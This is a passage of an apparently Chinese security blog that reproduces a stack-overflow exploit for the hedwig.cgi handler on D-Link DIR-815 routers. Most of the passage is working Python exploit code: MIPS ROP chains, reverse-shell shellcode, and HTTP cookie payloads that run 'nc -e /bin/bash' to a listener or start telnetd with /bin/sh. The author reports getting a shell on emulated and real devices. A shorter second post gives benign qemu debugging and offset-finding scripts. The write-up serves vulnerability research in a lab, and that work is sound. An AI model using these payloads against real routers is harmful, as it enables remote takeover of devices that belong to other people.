<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/ncvlp9999.png" alt=""></p>
</li>
<li><p>利用sleep(1)调用shellcode</p>
<p>这里的shllcode作用是给指定的IP地址和端口反弹shell，根据<a href="http://shell-storm.org/shellcode/files/shellcode-860.php" target="_blank" rel="noopener">文章</a>修改其中的socket反向连接IP，端口没有改变还是31337。</p>
<pre class=" language-sh"><code class="language-sh">#!/usr/bin/python2
from pwn import *
context.endian = "little"
context.arch = "mips"

shellcode = ""
shellcode += "\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"
shellcode += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
shellcode += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
shellcode += "\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01"
shellcode += "\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24"
shellcode += "\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20"
#shellcode += "\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"#192.168.1.177:31337
shellcode += "\xf8\xff\xa5\xaf\x4f\x91\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"#192.168.79.145
shellcode += "\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"
shellcode += "\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"
shellcode += "\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"
shellcode += "\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"
shellcode += "\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"
shellcode += "\xab\x0f\x02\x24\x0c\x09\x09\x01"

libc_base = 0x77f34000
sleep = 0x56BD0 #sleep jr ra 0x7678edf4
gadget1 = 0x57E50
gadget2 = 0x3B8A8
gadget3 = 0x14F28
gadget4 = 0x1DD08#0x15C84#0xBB44

payload = 'A' * 973 #1009-9*4
payload += 'A' * 4                           # s0
payload += p32(libc_base + gadget2)       # s1 = mipsrop.tail() &amp;&amp; move $ra,$(sp+0x24) &amp;&amp; jr s2
payload += p32(libc_base + sleep)         # s2 = jr $(sp+0x24)
payload += 'A' * 4                        # s3
payload += p32(libc_base + gadget4)       # s4 = mipsrop.find("move $t9,$s1") &amp;&amp; jr shellcode
payload += 'A' * 4                           # s5
payload += 'A' * 4                        # s6
payload += 'A' * 4                        # s7
payload += 'A' * 4                        # fp
payload += p32(libc_base + gadget1)       # ra = mipsrop.find("li $a0,1") &amp;&amp; jr s1

payload += 'B' * 0x24 # mipsrop.tail() 0x24B padding
payload += p32(libc_base + gadget3)       # $(sp+0x24) = mipsrop.stackfinder() &amp;&amp; move s1,$(sp+0x18) &amp;&amp; jr $s4

payload += 'c' * 0x18 # mipsrop.stackfinder() 0x18B padding
payload += shellcode

f = open("exploit2",'wb+')
f.write(payload)
f.close()</code></pre>
<p>生成的exploit2通过scp拷贝到mips虚拟机中并且<code>nano debug.sh</code>更改debug.sh运行得到shell。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/ncvlp31337.png" alt=""></p>
</li>
</ol>
<p>利用HTTP报文获取shell,其实现在mips虚拟机相当于一个开启了部分web服务的DIR815路由器，我们可以通过发送http报文获取shell。</p>
<p>利用system函数</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"mips"</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

<span class="token keyword">def</span> <span class="token function">get_payload</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> libc_base<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    gadget1 <span class="token operator">=</span> <span class="token number">0x45988</span>
    gadget2 <span class="token operator">=</span> <span class="token number">0x159cc</span>
    system_addr_1 <span class="token operator">=</span> <span class="token number">0x53200</span><span class="token operator">-</span><span class="token number">1</span>
    payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> offset
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> system_addr_1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget2<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s1</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s2</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s4</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget1<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># ra</span>
    payload <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x10</span>
    payload <span class="token operator">+=</span> cmd
    <span class="token keyword">return</span> payload

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    cmd <span class="token operator">=</span> <span class="token string">"nc -e /bin/bash 192.168.79.145 9999"</span>
    cookie<span class="token operator">=</span><span class="token string">'uid='</span> <span class="token operator">+</span> get_payload<span class="token punctuation">(</span><span class="token number">973</span><span class="token punctuation">,</span> <span class="token number">0x77f34000</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
    header <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'Cookie'</span>        <span class="token punctuation">:</span> cookie<span class="token punctuation">,</span>
        <span class="token string">'Content-Type'</span>  <span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>
        <span class="token string">'Content-Length'</span><span class="token punctuation">:</span> <span class="token string">'100'</span>
        <span class="token punctuation">}</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'uid'</span><span class="token punctuation">:</span><span class="token string">'1234'</span><span class="token punctuation">}</span>
    ip_port<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    url<span class="token operator">=</span><span class="token string">"http://"</span><span class="token operator">+</span>ip_port<span class="token operator">+</span><span class="token string">"/hedwig.cgi"</span>
    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">print</span> r<span class="token punctuation">.</span>text</code></pre>
<p>测试结果：获取shell</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/httpshell.png" alt=""></p>
<p>利用sleep调用shellcode(反弹shell)</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"mips"</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

<span class="token keyword">def</span> <span class="token function">get_payload</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> libc_base<span class="token punctuation">)</span><span class="token punctuation">:</span>

    shellcode <span class="token operator">=</span> <span class="token string">""</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20"</span>
    <span class="token comment" spellcheck="true">#shellcode += "\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"#192.168.1.177:31337</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xf8\xff\xa5\xaf\x4f\x91\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"</span><span class="token comment" spellcheck="true">#192.168.79.145</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"</span>
    shellcode <span class="token operator">+=</span> <span class="token string">"\xab\x0f\x02\x24\x0c\x09\x09\x01"</span>

    sleep <span class="token operator">=</span> <span class="token number">0x56BD0</span> <span class="token comment" spellcheck="true">#sleep jr ra 0x7678edf4</span>
    gadget1 <span class="token operator">=</span> <span class="token number">0x57E50</span>
    gadget2 <span class="token operator">=</span> <span class="token number">0x3B8A8</span>
    gadget3 <span class="token operator">=</span> <span class="token number">0x14F28</span>
    gadget4 <span class="token operator">=</span> <span class="token number">0x1DD08</span><span class="token comment" spellcheck="true">#0x15C84#0xBB44</span>

    payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> offset <span class="token comment" spellcheck="true">#1009-9*4</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s0</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget2<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s1 = mipsrop.tail() &amp;&amp; move $ra,$(sp+0x24) &amp;&amp; jr s2</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> sleep<span class="token punctuation">)</span>         <span class="token comment" spellcheck="true"># s2 = jr $(sp+0x24)</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget4<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s4 = mipsrop.find("move $t9,$s1") &amp;&amp; jr shellcode</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget1<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># ra = mipsrop.find("li $a0,1") &amp;&amp; jr s1</span>

    payload <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x24</span> <span class="token comment" spellcheck="true"># mipsrop.tail() 0x24B padding</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget3<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># $(sp+0x24) = mipsrop.stackfinder() &amp;&amp; move s1,$(sp+0x18) &amp;&amp; jr $s4</span>

    payload <span class="token operator">+=</span> <span class="token string">'c'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token comment" spellcheck="true"># mipsrop.stackfinder() 0x18B padding</span>
    payload <span class="token operator">+=</span> shellcode

    <span class="token keyword">return</span> payload

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>

    cookie<span class="token operator">=</span><span class="token string">'uid='</span> <span class="token operator">+</span> get_payload<span class="token punctuation">(</span><span class="token number">973</span><span class="token punctuation">,</span> <span class="token number">0x77f34000</span><span class="token punctuation">)</span>
    header <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'Cookie'</span>        <span class="token punctuation">:</span> cookie<span class="token punctuation">,</span>
        <span class="token string">'Content-Type'</span>  <span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>
        <span class="token string">'Content-Length'</span><span class="token punctuation">:</span> <span class="token string">'100'</span>
        <span class="token punctuation">}</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'uid'</span><span class="token punctuation">:</span><span class="token string">'1234'</span><span class="token punctuation">}</span>
    ip_port<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    url<span class="token operator">=</span><span class="token string">"http://"</span><span class="token operator">+</span>ip_port<span class="token operator">+</span><span class="token string">"/hedwig.cgi"</span>
    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">print</span> r<span class="token punctuation">.</span>text</code></pre>
<p>测试结果：获取shell</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/http_getshell_sleep.png" alt=""></p>
<h1 id="Firmadyne仿真及实体机测试"><a href="#Firmadyne仿真及实体机测试" class="headerlink" title="Firmadyne仿真及实体机测试"></a>Firmadyne仿真及实体机测试</h1><p>Firmadyne的安装过程这里就不再继续介绍，这里是用它来测试，能够启动起来。并且访问firmadyne给其分配的默认web接口192.168.0.1。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/firmadyne.png" alt=""></p>
<p>nmap扫描查看开放的端口，目前3各端口分别对应dns53,http80,upnp49152。</p>
<pre class=" language-sh"><code class="language-sh">Starting Nmap 7.01 ( https://nmap.org ) at 2020-05-24 16:21 CST
Nmap scan report for 192.168.0.1
Host is up (0.00041s latency).
Not shown: 997 closed ports
PORT      STATE SERVICE VERSION
53/tcp    open  domain  dnsmasq 2.45
80/tcp    open  http    D-Link DIR-815 WAP http config 1.01
49152/tcp open  upnp    D-Link DIR-815 WAP UPnP 1.01 (UPnP 1.0)
MAC Address: 52:54:00:12:34:58 (QEMU virtual NIC)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
OS details: Linux 2.6.32
Network Distance: 1 hop
Service Info: OS: Linux; Device: WAP; CPE: cpe:/h:dlink:dir-815:1.01, cpe:/o:linux:linux_kernel, cpe:/h:d-link:dir-815</code></pre>
<p>构造exp进行测试</p>
<p>其实这里需要跟之前qemu系统模式一样，上传gdbsever进行调试确定偏移和libc基地址。这里直接利用师傅帖子中的代码进行测试。这里的基地址是根据firmadyne中用linux内核版本为2.6.32，别的帖子中测试的基地址为0x2aaf8000，并且metasploit里面的<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/dlink_hedwig_cgi_bof.rb" target="_blank" rel="noopener">payload</a>写到：路由器环境中基地址为0x2aaf8000，qemu环境为0x40854000。两个可以都试试！</p>
<pre class=" language-sh"><code class="language-sh">[ 'Multiple Targets: D-Link DIR-645 v1.03, DIR-300 v2.14, DIR-600',
            {
              'Offset'      =&gt; 973,
              'LibcBase'    =&gt; 0x2aaf8000,    # Router
              #'LibcBase'   =&gt; 0x40854000,    # QEMU environment
              'System'      =&gt; 0x000531FF,    # address of system
              'CalcSystem'  =&gt; 0x000158C8,    # calculate the correct address of system
              'CallSystem'  =&gt; 0x000159CC,    # call our system
            }
          ]</code></pre>
<p>下面编写exp进行测试，利用system函数进行测试。</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"mips"</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

<span class="token keyword">def</span> <span class="token function">get_payload</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> libc_base<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    gadget1 <span class="token operator">=</span> <span class="token number">0x45988</span>
    gadget2 <span class="token operator">=</span> <span class="token number">0x159cc</span>
    system_addr_1 <span class="token operator">=</span> <span class="token number">0x53200</span><span class="token operator">-</span><span class="token number">1</span>
    payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> offset
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> system_addr_1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> g    adget2<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true"># s1</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s2</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s4</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget1<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># ra</span>
    payload <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x10</span>
    payload <span class="token operator">+=</span> cmd
    <span class="token keyword">return</span> payload

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true">#cmd = "nc -e /bin/bash 192.168.79.145 9999"</span>
    cmd <span class="token operator">=</span> <span class="token string">'telnetd -p 222 -l /bin/sh'</span>
    cookie<span class="token operator">=</span><span class="token string">'uid='</span> <span class="token operator">+</span> get_payload<span class="token punctuation">(</span><span class="token number">973</span><span class="token punctuation">,</span> <span class="token number">0x2aaf8000</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
    header <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'Cookie'</span>        <span class="token punctuation">:</span> cookie<span class="token punctuation">,</span>
        <span class="token string">'Content-Type'</span>  <span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>
        <span class="token string">'Content-Length'</span><span class="token punctuation">:</span> <span class="token string">'100'</span>
        <span class="token punctuation">}</span>
    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'uid'</span><span class="token punctuation">:</span><span class="token string">'1234'</span><span class="token punctuation">}</span>
    ip_port<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    url<span class="token operator">=</span><span class="token string">"http://"</span><span class="token operator">+</span>ip_port<span class="token operator">+</span><span class="token string">"/hedwig.cgi"</span>
    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
    <span class="token keyword">print</span> r<span class="token punctuation">.</span>text</code></pre>
<p>测试结果显示能够执行<code>telnetd -p 222 -l /bin/sh</code>。telnet 上去对应的窗口直接反弹shell。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/telnetdp222.png" alt=""></p>
<p>在实体机上刷上1.01的版本，用system方法的exp同样能得到获取shell。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.anquanke.com/post/id/179510#h3-8" target="_blank" rel="noopener">路由器漏洞挖掘之 DIR-815 栈溢出漏洞分析</a></p>
<p><a href="https://www.anquanke.com/post/id/187443#h2-9" target="_blank" rel="noopener">IOT设备漏洞挖掘从入门到入门（二）- DLink Dir 815漏洞分析及三种方式模拟复现</a></p>
<p><a href="https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN/#Run-POC-amp-amp-反弹get-shell" target="_blank" rel="noopener">Building MIPS Environment for Router &amp;&amp; PWN</a> </p>
<p><a href="http://shell-storm.org/shellcode/" target="_blank" rel="noopener">http://shell-storm.org/shellcode/</a> </p>
<p><a href="http://xdxd.love/2016/12/09/一个mips栈溢出利用/" target="_blank" rel="noopener">一个mips栈溢出</a></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>iot</category>
      </categories>
      <tags>
        <tag>dlink</tag>
        <tag>dir-815</tag>
      </tags>
  </entry>
  <entry>
    <title>路由器漏洞调试相关脚本</title>
    <url>/2020/05/22/lu-you-qi-lou-dong-diao-shi-xiang-guan-jiao-ben/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录下路由器漏洞调试过程中使用到的一些脚本，该帖子会不断更新的。</p>
<h1 id="qemu用户模式动态调试脚本"><a href="#qemu用户模式动态调试脚本" class="headerlink" title="qemu用户模式动态调试脚本"></a>qemu用户模式动态调试脚本</h1><p>test.sh（以D-LINK DIR815缓冲区漏洞调试脚本为例）</p>
<pre class=" language-sh"><code class="language-sh">#/bin/bash
test=$(python -c "print 'uid=1234&password='+'A'*0x600")
LEN=$(echo -n "$test" | wc -c)
PORT="23957"
cp $(which qemu-mipsel-static) ./qemu
sudo chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$test -E REQUEST_URL="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT /htdocs/web/hedwig.cgi 2>/dev/null
rm -f ./qemu</code></pre>
<p>-E 指定环境变量，-g 指定调试端口，“2&gt; /dev/null” 代表忽略掉错误提示信息。</p>
<pre class=" language-text"><code class="language-text">2表示标准错误。文件描述符我们常见的就是系统预留的0，1和2这三个，他们的意义分别有如下对应关系： 0,1,2分别代表标准输入，标准输出，标准错误。
‘>‘表示重定向。 
/dev/null是一个特殊的设备文件，这个文件接收到的任何数据都会被丢弃。因此，null这个设备通常也被成为位桶（bit bucket）或黑洞。 </code></pre>
<p>一般要用qemu用户模式进行调试可以通过chroot切换根目录到当前根文件系统下。</p>
<pre class=" language-sh"><code class="language-sh">cp $(which qemu-mipsel-static ) .
sudo chroot . qemu-mipsel-static bin/busybox</code></pre>
<p>或者通过-L 来指定根目录以便程序动态运行时能在根目录下的/lib文件夹中找到动态链接库</p>
<pre class=" language-sh"><code class="language-sh">qemu-mipsel -L . bin/busybox</code></pre>
<h1 id="计算偏移脚本"><a href="#计算偏移脚本" class="headerlink" title="计算偏移脚本"></a>计算偏移脚本</h1><p>patternLocOffset.py</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python2</span>
<span class="token comment" spellcheck="true">#####################################################################################</span>
<span class="token comment" spellcheck="true">## Create pattern strings &amp; location offset</span>
<span class="token comment" spellcheck="true">##</span>
<span class="token comment" spellcheck="true">## Example:</span>
<span class="token comment" spellcheck="true">## C:\Users\Lenov\Desktop> patterLocOffset.py -c -l 260 -f output.txt</span>
<span class="token comment" spellcheck="true">### [*] Create pattern string contains 260 characters ok!</span>
<span class="token comment" spellcheck="true">### [+] output to output.txt ok!</span>
<span class="token comment" spellcheck="true">##</span>
<span class="token comment" spellcheck="true">## C:\Users\Lenov\Desktop> patternLocOffset.py -s 0x41613141 -l 260</span>
<span class="token comment" spellcheck="true">### [*] Create pattern string contains 260 characters ok!</span>
<span class="token comment" spellcheck="true">### [*] Exact match at offset 3</span>
<span class="token comment" spellcheck="true">#</span>
<span class="token comment" spellcheck="true">#####################################################################################</span>

<span class="token keyword">import</span> argparse
<span class="token keyword">import</span> struct
<span class="token keyword">import</span> binascii
<span class="token keyword">import</span> string
<span class="token keyword">import</span> time
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> re

a <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>
b <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz"</span>
c <span class="token operator">=</span> <span class="token string">"0123456789"</span>

<span class="token keyword">def</span> <span class="token function">generate</span><span class="token punctuation">(</span>count<span class="token punctuation">,</span>output<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true">#</span>
    <span class="token comment" spellcheck="true"># pattern create</span>
    codeStr <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">print</span> <span class="token string">'[*] Create pattern string contains %d characters'</span><span class="token operator">%</span>count<span class="token punctuation">,</span>
    timeStart <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>count<span class="token punctuation">)</span><span class="token punctuation">:</span>
